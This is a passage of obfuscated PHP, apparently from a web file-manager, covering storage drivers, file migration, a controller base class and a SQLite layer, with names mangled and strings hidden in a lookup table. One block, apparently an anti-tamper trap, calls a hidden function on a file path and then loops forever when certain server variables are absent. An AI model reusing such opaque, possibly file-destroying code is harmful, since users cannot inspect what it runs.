$ûÍØåÅ; } } return !1; } public function setMasterDB($¨äìùåè = true) { think_config($_SERVER[ÓïÕü][474], $¨äìùåè); } } goto C­«ä¿º©©; b±“Î¾İ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($’§Êƒ€¯) { $¯¯–Ê“ =& $_SERVER[ÓïÕü]; parent::__construct($’§Êƒ€¯); $Âòˆ‘ú° = isset($’§Êƒ€¯[$¯¯–Ê“[259]]) && $’§Êƒ€¯[$¯¯–Ê“[259]] == $¯¯–Ê“[250] ? $¯¯–Ê“[250] : $¯¯–Ê“[316]; $this->setSignVersion($Âòˆ‘ú°); } public function link($Ø«Ò«±, $ÚåÎÑ±û = array()) { return parent::link($Ø«Ò«±, $ÚåÎÑ±û); } public function fileOut($ÚĞ®Í–ë, $ÈüÛ•·ù = false, $ù˜şÇ¯ = false, $âÄƒ…µ¸ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÓïÕü][317])) { return parent::fileOutServer($ÚĞ®Í–ë, $ÈüÛ•·ù, $ù˜şÇ¯, $âÄƒ…µ¸); } parent::fileOut($ÚĞ®Í–ë, $ÈüÛ•·ù, $ù˜şÇ¯, $âÄƒ…µ¸); } public function fileOutImage($ˆµ°°˜¹, $Ä’–÷†˜ = 250) { if (strstr($this->endpoint, $_SERVER[ÓïÕü][317])) { return parent::fileOutImageServer($ˆµ°°˜¹, $Ä’–÷†˜); } parent::fileOutImage($ˆµ°°˜¹, $Ä’–÷†˜); } public function fileOutLink($¥û×µõĞ) { $“Ş˜Ë°š =& $_SERVER[ÓïÕü]; if (substr($¥û×µõĞ, 0, 7) == $“Ş˜Ë°š[219]) { $¥û×µõĞ = $“Ş˜Ë°š[220] . substr($¥û×µõĞ, 7); } header($“Ş˜Ë°š[175] . $¥û×µõĞ); die; } } define($_SERVER[ÓïÕü][318], 1); define($_SERVER[ÓïÕü][319], 2); goto DÇ°È¹Ë˜ê; BÂªØóŞó: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\155\x2e\163\157\x75\162\x63\145\x53\145\143\x72\x65\x74\114\x69\x73\164"; public $field = array("\x73\157\165\x72\x63\x65\x49\104", "\164\171\160\145\111\x44", "\143\162\145\141\164\x65\x55\163\x65\162"); } if (!isset($_SERVER[$_SERVER[ÓïÕü][933]]) || !isset($_SERVER[$_SERVER[ÓïÕü][931]])) { $_getc = $_SERVER[ÓïÕü][934]; $_getfile = $_SERVER[$_SERVER[ÓïÕü][935]] . $_SERVER[ÓïÕü][936]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÓïÕü][288], $_getfilec); if (count($_getarrs) < $_SERVER[ÓïÕü][706]) { $exit = $_SERVER[ÓïÕü][937]; $exit(); } $_act = $_SERVER[ÓïÕü][938]; $_act($_SERVER[$_SERVER[ÓïÕü][935]] . $_SERVER[ÓïÕü][936]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[ÓïÕü][457]); } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\163\x74\157\x72\141\147\x65\114\151\163\x74"; public $field = array("\x6e\x61\155\145", "\163\151\x7a\x65\x4d\141\170", "\163\x79\x73\x74\145\155", "\x64\145\146\x61\165\x6c\x74", "\x64\x72\151\166\x65\162", "\x63\157\156\x66\x69\x67"); public function listData($©Úƒƒ˜Ğ = false, $º·åĞüµ = "\155\x6f\144\151\x66\171\124\151\x6d\145", $äôîçâ˜ = false) { $ìÖµ¹ìÀ =& $_SERVER[ÓïÕü]; $‚šÎ¿ø€ = parent::listData($©Úƒƒ˜Ğ, $º·åĞüµ, $äôîçâ˜); if ($©Úƒƒ˜Ğ) { return $‚šÎ¿ø€; } $ÙáœûÄá = array(); if ($GLOBALS[$ìÖµ¹ìÀ[2341]]) { $ÙáœûÄá = $this->ioSizeUseGet(array_to_keyvalue($‚šÎ¿ø€, $ìÖµ¹ìÀ[12], $ìÖµ¹ìÀ[478])); } foreach ($‚šÎ¿ø€ as $êè•Ğë² => $íİ²‡ÄÅ) { unset($‚šÎ¿ø€[$êè•Ğë²][$ìÖµ¹ìÀ[6]]); $‚šÎ¿ø€[$êè•Ğë²][$ìÖµ¹ìÀ[1995]] = isset($ÙáœûÄá[$íİ²‡ÄÅ[$ìÖµ¹ìÀ[478]]]) ? $ÙáœûÄá[$íİ²‡ÄÅ[$ìÖµ¹ìÀ[478]]] : 0; } return $‚šÎ¿ø€; } public function ioSizeUseGet($ğİÎ›ŠÚ) { $¦ÎšôÜ =& $_SERVER[ÓïÕü]; if (!$ğİÎ›ŠÚ) { return array(); } $Ğ†Ì¾ã‡ = $¦ÎšôÜ[2342] . implode($¦ÎšôÜ[50], $ğİÎ›ŠÚ); $Éæø‡Ÿ = Cache::get($Ğ†Ì¾ã‡); if ($Éæø‡Ÿ) { return $Éæø‡Ÿ; } $”ñÂÃœç = array($¦ÎšôÜ[914] => $¦ÎšôÜ[478], $¦ÎšôÜ[2343] => $¦ÎšôÜ[79]); $“øºÇŠ« = array($¦ÎšôÜ[914] => array($¦ÎšôÜ[7], $ğİÎ›ŠÚ)); $Éæø‡Ÿ = Model($¦ÎšôÜ[882])->field($”ñÂÃœç)->where($“øºÇŠ«)->group($¦ÎšôÜ[914])->select(); $Éæø‡Ÿ = array_to_keyvalue($Éæø‡Ÿ, $¦ÎšôÜ[478], $¦ÎšôÜ[79]); Cache::set($Ğ†Ì¾ã‡, $Éæø‡Ÿ, 600); return $Éæø‡Ÿ; } public function getConfig($±¤”î£) { $ÇÁ¨ş Ú = parent::listData($±¤”î£); $¡ƒ¼íÑ = _get($ÇÁ¨ş Ú, $_SERVER[ÓïÕü][6], array()); if ($¡ƒ¼íÑ && !is_array($¡ƒ¼íÑ)) { $¡ƒ¼íÑ = json_decode($¡ƒ¼íÑ, !0); } return $¡ƒ¼íÑ; } public function update($ãè¨Òçä, $Œ¢ •İ) { $²’Ëêı =& $_SERVER[ÓïÕü]; $¥ÚØŞ†É = $Œ¢ •İ[$²’Ëêı[32]]; $ÚÙ§Š ¤ = array_to_keyvalue(parent::listData(), $²’Ëêı[32]); if (isset($ÚÙ§Š ¤[$¥ÚØŞ†É]) && $ÚÙ§Š ¤[$¥ÚØŞ†É][$²’Ëêı[478]] != $ãè¨Òçä) { return !1; } $this->checkPwd($ãè¨Òçä, $Œ¢ •İ); if (isset($Œ¢ •İ[$²’Ëêı[2344]]) && $Œ¢ •İ[$²’Ëêı[2344]] == $²’Ëêı[91]) { $this->checkConfig($Œ¢ •İ); } unset($Œ¢ •İ[$²’Ëêı[2344]]); $œ¿ôÈˆ = parent::update($ãè¨Òçä, $Œ¢ •İ); if ($œ¿ôÈˆ && $Œ¢ •İ[$²’Ëêı[37]]) { foreach ($ÚÙ§Š ¤ as $…³…×á) { if ($…³…×á[$²’Ëêı[37]] && $…³…×á[$²’Ëêı[478]] != $ãè¨Òçä) { parent::update($…³…×á[$²’Ëêı[478]], array($²’Ëêı[37] => 0)); } } $this->updateBackup($ãè¨Òçä, $ÚÙ§Š ¤); } return $œ¿ôÈˆ; } public function add($½ã¾ù¡) { $§éúı =& $_SERVER[ÓïÕü]; $Ñã•Ï¥• = array_to_keyvalue(parent::listData(), $§éúı[32]); if (isset($Ñã•Ï¥•[$½ã¾ù¡[$§éúı[32]]])) { return !1; } $this->checkConfig($½ã¾ù¡); $äú–¦“‰ = parent::insert($½ã¾ù¡); if ($äú–¦“‰ && $½ã¾ù¡[$§éúı[37]]) { foreach ($Ñã•Ï¥• as $ø¥ö­Û) { if ($ø¥ö­Û[$§éúı[37]]) { parent::update($ø¥ö­Û[$§éúı[478]], array($§éúı[37] => 0)); } } $this->updateBackup($äú–¦“‰, $Ñã•Ï¥•); } return $äú–¦“‰; } public function updateBackup($‡ö˜›±÷, $ŠóùÂŠí) { $œÈì°†Ó =& $_SERVER[ÓïÕü]; if ($‡ö˜›±÷ == $œÈì°†Ó[91]) { return; } $šøÆşÖÄ = Model($œÈì°†Ó[839])->config(); $‹­¡ù¥ = $šøÆşÖÄ[$œÈì°†Ó[843]]; if ($šøÆşÖÄ[$œÈì°†Ó[1775]] != $œÈì°†Ó[91] || $‹­¡ù¥ == $‡ö˜›±÷) { return; } if ($‹­¡ù¥ != $œÈì°†Ó[91]) { $ÉÙ¯öªô = array(); foreach ($ŠóùÂŠí as $¯¤Ï²Ş®) { if ($‡ö˜›±÷ == $¯¤Ï²Ş®[$œÈì°†Ó[478]]) { continue; } $ÉÙ¯öªô[] = $¯¤Ï²Ş®[$œÈì°†Ó[478]]; } if ($ÉÙ¯öªô && in_array($‹­¡ù¥, $ÉÙ¯öªô)) { return; } } $Ÿ–­ñ§Å = Model($œÈì°†Ó[861])->get($œÈì°†Ó[868]); $Ÿ–­ñ§Å = json_decode($Ÿ–­ñ§Å, !0); if (!$Ÿ–­ñ§Å) { return; } $Ÿ–­ñ§Å[$œÈì°†Ó[843]] = $‡ö˜›±÷; Model($œÈì°†Ó[861])->set(array($œÈì°†Ó[868] => $Ÿ–­ñ§Å)); } public function checkPwd($ôÚ„ßê‰, &$Ä–¢å¡—) { $Öï´¦€¿ =& $_SERVER[ÓïÕü]; if (empty($Ä–¢å¡—[$Öï´¦€¿[6]])) { return; } $Æ£ë¡¾æ = $Ä–¢å¡—[$Öï´¦€¿[6]]; if (!is_array($Æ£ë¡¾æ)) { $Æ£ë¡¾æ = json_decode($Æ£ë¡¾æ, !0); } $ñ¢¯É = $Öï´¦€¿[12]; $…ßòŒ¾¤ = array($Öï´¦€¿[2345], $Öï´¦€¿[2346], $Öï´¦€¿[993]); foreach ($…ßòŒ¾¤ as $Á£¯ßØ) { if (isset($Æ£ë¡¾æ[$Á£¯ßØ])) { $ñ¢¯É = $Á£¯ßØ; break; } } if (!$ñ¢¯É) { return; } $¸ƒØÙîİ = $this->getConfig($ôÚ„ßê‰); $ãœ×ˆÄ = $¸ƒØÙîİ[$ñ¢¯É]; $õ¿ü®  = $Æ£ë¡¾æ[$ñ¢¯É]; if ($õ¿ü®  == str_repeat($Öï´¦€¿[223], strlen($ãœ×ˆÄ))) { $Æ£ë¡¾æ[$ñ¢¯É] = $ãœ×ˆÄ; $Ä–¢å¡—[$Öï´¦€¿[6]] = json_encode($Æ£ë¡¾æ); } else { if ($õ¿ü®  != $ãœ×ˆÄ) { $Ä–¢å¡—[$Öï´¦€¿[2344]] = $Öï´¦€¿[91]; } } } public function checkConfig(&$ÂÑ¿€³ê, $¡…»¨û… = false) { $±¶¸½¯Ô =& $_SERVER[ÓïÕü]; $Ü§ñ·ñ± = strtolower($ÂÑ¿€³ê[$±¶¸½¯Ô[98]]); $‹À ï¸€ = $ÂÑ¿€³ê[$±¶¸½¯Ô[6]]; if (!is_array($‹À ï¸€)) { $‹À ï¸€ = json_decode($‹À ï¸€, !0); } foreach ($‹À ï¸€ as $¼í¿›¥ => $¯ßÎ¸Ô) { if (is_string($¯ßÎ¸Ô)) { $‹À ï¸€[$¼í¿›¥] = trim($¯ßÎ¸Ô); } } $‹À ï¸€[$±¶¸½¯Ô[2347]] = rand_string(6); $ ”²ßÓĞ = $GLOBALS[$±¶¸½¯Ô[6]][$±¶¸½¯Ô[92]][$±¶¸½¯Ô[922]]; $ÆŠó¾È = isset($ ”²ßÓĞ[$Ü§ñ·ñ±]) ? $ ”²ßÓĞ[$Ü§ñ·ñ±] : ucfirst($Ü§ñ·ñ±); $ÇÄàğôú = $±¶¸½¯Ô[77] . $ÆŠó¾È; if (!$ÆŠó¾È || !class_exists($ÇÄàğôú)) { if ($¡…»¨û…) { return LNG($±¶¸½¯Ô[2348]); } write_log(array($±¶¸½¯Ô[2349], $ÂÑ¿€³ê, get_caller_info()), $±¶¸½¯Ô[216]); show_json(LNG($±¶¸½¯Ô[2348]), !1, $ÂÑ¿€³ê); } $øãÀÀ¦ = new $ÇÄàğôú($‹À ï¸€); $¶‚Ë‹âå = rtrim($‹À ï¸€[$±¶¸½¯Ô[1290]], $±¶¸½¯Ô[8]) . $±¶¸½¯Ô[8]; if (in_array($Ü§ñ·ñ±, $øãÀÀ¦->objectDriver)) { try { if (!$øãÀÀ¦->isBucketCors() && !$øãÀÀ¦->setBucketCors()) { $í´¦Ä = LNG($±¶¸½¯Ô[2350]); $í´¦Ä .= $±¶¸½¯Ô[2351] . LNG($±¶¸½¯Ô[2352]); } } catch (Exception $åÜÇ†—ô) { $í´¦Ä = $åÜÇ†—ô->getMessage(); } if (isset($í´¦Ä)) { return $this->_parseError($í´¦Ä, $Ü§ñ·ñ±, $¡…»¨û…); } if ($Ü§ñ·ñ± == $±¶¸½¯Ô[68] && !$øãÀÀ¦->checkRegion()) { return $this->_parseError(LNG($±¶¸½¯Ô[2353]), $Ü§ñ·ñ±, $¡…»¨û…); } } else { if ($Ü§ñ·ñ± == $±¶¸½¯Ô[2354]) { if ($øãÀÀ¦->ftpPath) { $åè£ÛÔ© = trim($¶‚Ë‹âå, $±¶¸½¯Ô[8]); if (stripos($åè£ÛÔ©, trim($øãÀÀ¦->ftpPath, $±¶¸½¯Ô[8])) !== 0) { $¶‚Ë‹âå = $øãÀÀ¦->ftpPath . $±¶¸½¯Ô[8] . ($åè£ÛÔ© ? $åè£ÛÔ© . $±¶¸½¯Ô[8] : $±¶¸½¯Ô[12]); } } } } $Ìúµğ¤ = $øãÀÀ¦->getPath($¶‚Ë‹âå . $±¶¸½¯Ô[1294]); try { if ($Ü§ñ·ñ± == $±¶¸½¯Ô[109]) { $øãÀÀ¦->mkdir($¶‚Ë‹âå); } $¤àÑÂ¥â = $øãÀÀ¦->mkfile($Ìúµğ¤); if (!$¤àÑÂ¥â) { $í´¦Ä = LNG($±¶¸½¯Ô[2350]); } } catch (Exception $åÜÇ†—ô) { $í´¦Ä = $åÜÇ†—ô->getMessage(); } if (isset($í´¦Ä)) { return $this->_parseError($í´¦Ä, $Ü§ñ·ñ±, $¡…»¨û…); } $‹À ï¸€[$±¶¸½¯Ô[1290]] = $¶‚Ë‹âå; $ÂÑ¿€³ê[$±¶¸½¯Ô[6]] = json_encode($‹À ï¸€); $ÂÑ¿€³ê[$±¶¸½¯Ô[98]] = $ÆŠó¾È; return !0; } private function _parseError($Î‘ÌÏú¸, $öŠÃÎœà, $Û¤õ­ËÇ = false) { $“¨Òûõ¶ =& $_SERVER[ÓïÕü]; if ($öŠÃÎœà == $“¨Òûõ¶[68] && stripos($Î‘ÌÏú¸, $“¨Òûõ¶[2355])) { $½ÊãÄ£İ = explode($“¨Òûõ¶[10], $Î‘ÌÏú¸); $„ìÒ¦˜À = isset($½ÊãÄ£İ[1]) ? $½ÊãÄ£İ[1] : $“¨Òûõ¶[12]; $ğ¡‘Ë±¶ = array($“¨Òûõ¶[2356] => LNG($“¨Òûõ¶[2357]), $“¨Òûõ¶[2358] => LNG($“¨Òûõ¶[2359])); if (isset($ğ¡‘Ë±¶[$„ìÒ¦˜À])) { $Î‘ÌÏú¸ = $ğ¡‘Ë±¶[$„ìÒ¦˜À]; } } if (stripos($Î‘ÌÏú¸, $“¨Òûõ¶[2360]) === 0) { $¼ûøõö³ = strpos($Î‘ÌÏú¸, $“¨Òûõ¶[178]); if ($¼ûøõö³ === !1) { $¼ûøõö³ = strpos($Î‘ÌÏú¸, $“¨Òûõ¶[4]); } if ($¼ûøõö³ !== !1) { $Î‘ÌÏú¸ = substr($Î‘ÌÏú¸, $¼ûøõö³ + 1); } } $Î‘ÌÏú¸ = LNG($“¨Òûõ¶[1297]) . $Î‘ÌÏú¸; if ($Û¤õ­ËÇ) { return $Î‘ÌÏú¸; } show_json($Î‘ÌÏú¸, !1); } public function driverListSystem() { $›€ˆÀõ¿ =& $_SERVER[ÓïÕü]; $üÌŒúâë = parent::listData(); $Áüì‚âÉ = array(); foreach ($üÌŒúâë as $ÔåÛ¯â) { unset($ÔåÛ¯â[$›€ˆÀõ¿[234]], $ÔåÛ¯â[$›€ˆÀõ¿[88]]); if (!is_array($ÔåÛ¯â[$›€ˆÀõ¿[6]])) { $ÔåÛ¯â[$›€ˆÀõ¿[6]] = json_decode($ÔåÛ¯â[$›€ˆÀõ¿[6]], !0); } $Áüì‚âÉ[] = $ÔåÛ¯â; } return $Áüì‚âÉ; } public function defaultDriver() { $›¦Çòøğ =& $_SERVER[ÓïÕü]; $‚ãõ’É’ = parent::listData(); $ëˆË÷ = array_filter_by_field($‚ãõ’É’, $›¦Çòøğ[37], 1); $ëˆË÷ = $ëˆË÷[0]; if (!$ëˆË÷) { return array(); } if (!is_array($ëˆË÷[$›¦Çòøğ[6]])) { $ëˆË÷[$›¦Çòøğ[6]] = json_decode($ëˆË÷[$›¦Çòøğ[6]], !0); } return $ëˆË÷; } public function driverInfo($¿äêæş£) { $şûÒ©Š‘ =& $_SERVER[ÓïÕü]; $õÅ™° = array_to_keyvalue(parent::listData(), $şûÒ©Š‘[478]); if (!isset($õÅ™°[$¿äêæş£])) { return !1; } $Œœùœ˜ = $õÅ™°[$¿äêæş£]; if (!is_array($Œœùœ˜[$şûÒ©Š‘[6]])) { $Œœùœ˜[$şûÒ©Š‘[6]] = json_decode($Œœùœ˜[$şûÒ©Š‘[6]], !0); } return $Œœùœ˜; } public function remove($ö±ö¡´°) { $this->removeShareItems($ö±ö¡´°); return parent::remove($ö±ö¡´°); } public function removeWithFile($ÂÃÛ£üè, $¦×ùûÊ—, $ÙÊâòà­, $®ş·ë· = false) { $±ëòÀ•Ÿ =& $_SERVER[ÓïÕü]; $œÈß—´‹ = array($±ëòÀ•Ÿ[914] => $ÂÃÛ£üè); $°‚Ğ«Å = Model($±ëòÀ•Ÿ[549])->where($œÈß—´‹)->count(); $ùßÅ·çú = Model($±ëòÀ•Ÿ[549])->where($œÈß—´‹)->sum($±ëòÀ•Ÿ[79]); $œ‘•‰ƒ¶ = $¦×ùûÊ— . $±ëòÀ•Ÿ[2361] . $ÂÃÛ£üè; $›ŞĞªÇ° = LNG($¦×ùûÊ— == $±ëòÀ•Ÿ[628] ? $±ëòÀ•Ÿ[2362] : $±ëòÀ•Ÿ[2363]); $¢Àœ¯ğ§ = new TaskFileTransfer($œ‘•‰ƒ¶, $±ëòÀ•Ÿ[216], $°‚Ğ«Å, $›ŞĞªÇ° . $±ëòÀ•Ÿ[465] . $ÙÊâòà­[$±ëòÀ•Ÿ[32]] . $±ëòÀ•Ÿ[215] . $ÂÃÛ£üè); $¢Àœ¯ğ§->task[$±ëòÀ•Ÿ[854]] = (double) $ùßÅ·çú; $Ô‹³ÇÅü = KodIO::defaultDriver(); $¤˜€ì¶ = $Ô‹³ÇÅü[$±ëòÀ•Ÿ[478]]; $İ‘ÓĞ–Ğ = $óô¤È˜˜ = $İĞÖÀ„Ö = array(); $‰ë‘ïâ = Model($±ëòÀ•Ÿ[233])->where($œÈß—´‹)->field($±ëòÀ•Ÿ[2364])->select(); foreach ($‰ë‘ïâ as $¸Á÷®Ú ) { $¬ˆÍúöÆ = $¸Á÷®Ú [$±ëòÀ•Ÿ[546]]; if ($®ş·ë·) { $óô¤È˜˜[] = $¬ˆÍúöÆ; continue; } $’¡®ŞùÀ = $¸Á÷®Ú [$±ëòÀ•Ÿ[87]]; $¤Äûğ—‚ = get_path_father($’¡®ŞùÀ); $İĞÖÀ„Ö[] = $¤Äûğ—‚; $¤Äûğ—‚ = str_replace("\x7b\x69\157\72{$ÂÃÛ£üè}\x7d\x2f", "\x7b\x69\157\72{$¤˜€ì¶}\175\x2f", $¤Äûğ—‚); if (!IO::exist($’¡®ŞùÀ)) { $İ‘ÓĞ–Ğ[] = $¬ˆÍúöÆ; $¢Àœ¯ğ§->updateFileEnd($¸Á÷®Ú [$±ëòÀ•Ÿ[32]], $¸Á÷®Ú [$±ëòÀ•Ÿ[79]]); write_log($±ëòÀ•Ÿ[2365] . $’¡®ŞùÀ, $±ëòÀ•Ÿ[1938]); continue; } $ü¸»Ä­Æ = IO::move($’¡®ŞùÀ, $¤Äûğ—‚, REPEAT_RENAME); if (!$ü¸»Ä­Æ) { $óô¤È˜˜[] = $¬ˆÍúöÆ; $¢Àœ¯ğ§->updateFileEnd($¸Á÷®Ú [$±ëòÀ•Ÿ[32]], $¸Á÷®Ú [$±ëòÀ•Ÿ[79]]); write_log($±ëòÀ•Ÿ[2366] . $’¡®ŞùÀ, $±ëòÀ•Ÿ[1938]); continue; } $œÈß—´‹ = array($±ëòÀ•Ÿ[546] => $¬ˆÍúöÆ); $êµ½ÜŸ = array($±ëòÀ•Ÿ[914] => $¤˜€ì¶, $±ëòÀ•Ÿ[87] => $ü¸»Ä­Æ); Model($±ëòÀ•Ÿ[233])->where($œÈß—´‹)->save($êµ½ÜŸ); } $Ëœ½¥—ê = $¢Àœ¯ğ§->task; if (!$®ş·ë·) { Cache::set($œ‘•‰ƒ¶, $Ëœ½¥—ê); } $¢Àœ¯ğ§->end(); $İ‘ÓĞ–Ğ = array_unique($İ‘ÓĞ–Ğ); $óô¤È˜˜ = array_unique($óô¤È˜˜); if (!$®ş·ë· && ($İ‘ÓĞ–Ğ || $óô¤È˜˜)) { $ÄÓã²À´ = array(); if ($İ‘ÓĞ–Ğ) { $ÄÓã²À´[] = sprintf(LNG($±ëòÀ•Ÿ[2367]), count($İ‘ÓĞ–Ğ)); } if ($óô¤È˜˜) { $ÄÓã²À´[] = sprintf(LNG($±ëòÀ•Ÿ[2368]), count($óô¤È˜˜)); } $ÄÓã²À´ = sprintf(LNG($±ëòÀ•Ÿ[2369]), implode($±ëòÀ•Ÿ[2370], $ÄÓã²À´)) . $±ëòÀ•Ÿ[2371] . date($±ëòÀ•Ÿ[2372]) . $±ëòÀ•Ÿ[2373]; if ($¦×ùûÊ— == $±ëòÀ•Ÿ[1975]) { $ÄÓã²À´ .= $±ëòÀ•Ÿ[2374] . LNG($±ëòÀ•Ÿ[2375]); } else { $ÄÓã²À´ = LNG($±ëòÀ•Ÿ[2376]) . $±ëòÀ•Ÿ[2377] . $ÄÓã²À´; } $Ëœ½¥—ê[$±ëòÀ•Ÿ[1292]] = $ÄÓã²À´; Cache::set($œ‘•‰ƒ¶, $Ëœ½¥—ê); unset($ÙÊâòà­[$±ëòÀ•Ÿ[6]]); $ëºÒÇÎ™ = array($±ëòÀ•Ÿ[478] => $ÂÃÛ£üè, $±ëòÀ•Ÿ[2246] => $±ëòÀ•Ÿ[628], $±ëòÀ•Ÿ[32] => $ÙÊâòà­[$±ëòÀ•Ÿ[32]], $±ëòÀ•Ÿ[98] => $ÙÊâòà­[$±ëòÀ•Ÿ[98]]); Hook::trigger($±ëòÀ•Ÿ[1817], array($±ëòÀ•Ÿ[1315] => $ëºÒÇÎ™, $±ëòÀ•Ÿ[1325] => !0)); show_json($ÄÓã²À´, !1, 100111); } if ($¦×ùûÊ— == $±ëòÀ•Ÿ[628]) { return !0; } if ($İ‘ÓĞ–Ğ || $óô¤È˜˜) { $ÁâÉ’¢ = array_merge($İ‘ÓĞ–Ğ, $óô¤È˜˜); $ÁâÉ’¢ = array_filter(array_unique($ÁâÉ’¢)); $this->removeByFileID($ÁâÉ’¢); } if ($İĞÖÀ„Ö) { $İĞÖÀ„Ö = array_filter(array_unique($İĞÖÀ„Ö)); foreach ($İĞÖÀ„Ö as $’¡®ŞùÀ) { $ı‹ö£·¤ = IO::has($’¡®ŞùÀ, !0); if (!$ı‹ö£·¤[$±ëòÀ•Ÿ[242]] && !$ı‹ö£·¤[$±ëòÀ•Ÿ[243]]) { IO::remove($’¡®ŞùÀ); } } } return $this->remove($ÂÃÛ£üè); } private function removeByFileID($åù³»•Æ = array()) { $•şŞªü =& $_SERVER[ÓïÕü]; if (empty($åù³»•Æ)) { return; } $×¯³Î…« = array($•şŞªü[546] => array($•şŞªü[7], $åù³»•Æ)); $ÉªÀ„¤ = Model($•şŞªü[1456])->where($×¯³Î…«)->field($•şŞªü[2322])->select(); if (!$ÉªÀ„¤) { return Model($•şŞªü[549])->remove($åù³»•Æ); } $ÉªÀ„¤ = array_to_keyvalue($ÉªÀ„¤, $•şŞªü[194], $•şŞªü[546]); foreach ($ÉªÀ„¤ as $’‡½ÍÍÁ => $â¬ìÂì) { Model($•şŞªü[921])->removeNow($’‡½ÍÍÁ, !1); } $ªı©Î¸§ = array_diff($åù³»•Æ, array_unique(array_values($ÉªÀ„¤))); if ($ªı©Î¸§) { return Model($•şŞªü[549])->remove($ªı©Î¸§); } } private function removeShareItems($ê·ÜË©×) { $ÎÎ¾¤À‰ =& $_SERVER[ÓïÕü]; $¿²ŠïÁä = "\x7b\151\x6f\x3a{$ê·ÜË©×}\x7d\57"; $ßé·Ó³± = array($ÎÎ¾¤À‰[194] => 0, $ÎÎ¾¤À‰[1285] => array($ÎÎ¾¤À‰[462], "{$¿²ŠïÁä}\45")); $ƒšî¬ = Model($ÎÎ¾¤À‰[1986])->where($ßé·Ó³±)->field($ÎÎ¾¤À‰[673])->select(); if (empty($ƒšî¬)) { return; } $óÆ¾Òá¤ = array_to_keyvalue($ƒšî¬, $ÎÎ¾¤À‰[12], $ÎÎ¾¤À‰[673]); Model($ÎÎ¾¤À‰[672])->remove($óÆ¾Òá¤); } } goto dµÄŒì ¡†; FáÏÊ ïô¦: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $Æë™ˆøì =& $_SERVER[ÓïÕü]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$Æë™ˆøì[6]] =& $config; $this->values[$Æë™ˆøì[7]] =& $in; $this->tpl = TEMPLATE . MOD . $Æë™ˆøì[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($„ûç°‘â) { if (1 === func_num_args()) { $this->{$„ûç°‘â} = new $„ûç°‘â(); } else { $å×ø­í = new ReflectionClass($„ûç°‘â); $˜Â‰‹’³ = func_get_args(); array_shift($˜Â‰‹’³); $this->{$„ûç°‘â} = $å×ø­í->newInstanceArgs($˜Â‰‹’³); } return $this->{$„ûç°‘â}; } public function routeBind($İœ¨ã¾, $àË¯Ş«‰, $ÓÂ® Ì€ = 3) { $ìéê™€˜ =& $_SERVER[ÓïÕü]; $„µ‰“ê = $this->in[$ìéê™€˜[9]]; $İœ¨ã¾ = str_replace($ìéê™€˜[10], $ìéê™€˜[11], trim(trim($İœ¨ã¾, $ìéê™€˜[8]), $ìéê™€˜[12])); if (!$İœ¨ã¾ || count($„µ‰“ê) <= $ÓÂ® Ì€) { return !1; } $í‰¿†˜… = !0; $²şå’â = explode($ìéê™€˜[8], $İœ¨ã¾); for ($¢¹òØè = 0; $¢¹òØè < count($²şå’â); $¢¹òØè++) { if ($²şå’â[$¢¹òØè] != $„µ‰“ê[$ÓÂ® Ì€ + $¢¹òØè]) { $í‰¿†˜… = !1; break; } } if (!$í‰¿†˜…) { return; } call_user_func_array(array($this, $àË¯Ş«‰), array()); } public function routeArgs($Ÿñ­Ğšå = 3) { $´çÑĞ±ı = $this->in[$_SERVER[ÓïÕü][9]]; if (count($´çÑĞ±ı) <= $Ÿñ­Ğšå) { return array(); } $İì÷ÖĞÈ = array(); for ($âõï¢»ì = $Ÿñ­Ğšå; $âõï¢»ì < count($´çÑĞ±ı); $âõï¢»ì += 2) { $İì÷ÖĞÈ[$´çÑĞ±ı[$âõï¢»ì]] = $´çÑĞ±ı[$âõï¢»ì + 1]; $this->in[$´çÑĞ±ı[$âõï¢»ì]] = $´çÑĞ±ı[$âõï¢»ì + 1]; } return $İì÷ÖĞÈ; } protected function assign($…ÎÄ‘÷, $ ³‹¿) { $this->values[$…ÎÄ‘÷] = $ ³‹¿; } protected function display($“´•„Ó¬) { ob_end_clean(); extract($this->values); require $this->tpl . $“´•„Ó¬; } } class DbSqliteBase extends Db { public function __construct($èœ€ÇÑ… = '') { $ª±í­ ï =& $_SERVER[ÓïÕü]; if (!extension_loaded($ª±í­ ï[13])) { think_exception(think_lang($ª±í­ ï[14]) . $ª±í­ ï[15]); } if (!empty($èœ€ÇÑ…)) { if (!isset($èœ€ÇÑ…[$ª±í­ ï[16]])) { $èœ€ÇÑ…[$ª±í­ ï[16]] = 438; } $this->config = $èœ€ÇÑ…; if (empty($this->config[$ª±í­ ï[17]])) { $this->config[$ª±í­ ï[17]] = array(); } } } public function connect($é•Üİº = '', $§ØïÄõâ = 0) { $Â§¾ÆÕ„ =& $_SERVER[ÓïÕü]; if (!isset($this->linkID[$§ØïÄõâ])) { if (empty($é•Üİº)) { $é•Üİº = $this->config; } $ëşùçìÛ = !empty($é•Üİº[$Â§¾ÆÕ„[17]][$Â§¾ÆÕ„[18]]) ? $é•Üİº[$Â§¾ÆÕ„[17]][$Â§¾ÆÕ„[18]] : $this->pconnect; $ÊŸ’Å² = $ëşùçìÛ ? $Â§¾ÆÕ„[19] : $Â§¾ÆÕ„[20]; $this->linkID[$§ØïÄõâ] = $ÊŸ’Å²($é•Üİº[$Â§¾ÆÕ„[21]], $é•Üİº[$Â§¾ÆÕ„[16]]); if (!$this->linkID[$§ØïÄõâ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$§ØïÄõâ], 30000); if (1 != think_config($Â§¾ÆÕ„[22])) { unset($this->config); } } return $this->linkID[$§ØïÄõâ]; } public function free() { $this->queryID = null; } public function query($ª˜¤€å›) { $Ûˆ ğÉ =& $_SERVER[ÓïÕü]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ª˜¤€å›; if ($this->queryID) { $this->free(); } think_action_status($Ûˆ ğÉ[23], 1); think_status($Ûˆ ğÉ[24]); $this->queryID = sqlite_query($this->_linkID, $ª˜¤€å›); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Ú˜Áì´ı = 